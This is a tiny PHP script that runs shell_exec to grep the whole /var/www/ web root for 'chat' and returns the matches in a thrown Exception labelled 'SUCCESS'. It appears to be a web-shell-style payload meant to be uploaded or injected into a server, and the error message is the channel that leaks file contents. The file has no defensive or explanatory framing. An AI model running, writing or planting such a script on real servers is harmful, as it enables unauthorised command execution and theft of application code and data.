<?php
$output ='';
$output =$output."\n /var/www/app/... ".shell_exec ('grep -r "chat" /var/www/ | xargs');


throw new Exception("\n SUCCESS  ". $output."\n");
?>
